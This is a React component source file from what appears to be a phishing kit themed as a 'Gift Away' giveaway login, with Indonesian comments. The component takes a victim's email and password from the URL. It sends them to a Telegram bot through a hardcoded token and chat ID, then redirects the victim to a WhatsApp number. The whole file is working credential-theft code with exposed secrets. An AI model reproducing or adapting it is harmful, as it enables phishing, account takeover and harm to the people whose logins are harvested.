import React, { useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";

async function sendMessage(telegram_id, message_text, token) {
  const url = `https://api.telegram.org/bot${token}/sendMessage?parse_mode=markdown&chat_id=${telegram_id}&text=${encodeURIComponent(
    message_text
  )}`;

  try {
    const response = await fetch(url);
    const data = await response.json();
    if (data.ok) {
      console.log("Pesan berhasil dikirim");
    } else {
      console.error("Gagal mengirim pesan");
    }
  } catch (error) {
    console.error("Gagal mengirim pesan", error);
  }
}

function SendTele() {
  const { email, password } = useParams();
  const router = useNavigate();
  useEffect(() => {
    if (email) {
      const token = "6609139420:AAHBa2lD1wVI9PzM915IUzYQnFrrnTQ1XoA"; // Ganti dengan token bot Telegram Anda
      const telegram_id = "6219231551"; // Ganti dengan ID Telegram penerima
      const message_text = `Ada Yang Login Gift Away \n Email : ${email} \n Password : ${password}`;

      sendMessage(telegram_id, message_text, token);
      window.location.href = "https://wa.me/6289653260395";
    } else {
      console.log("Masukan yang lain");
    }
  }, [email, password, router]);
  return (
    <div>
     
    </div>
  );
}

export default SendTele;
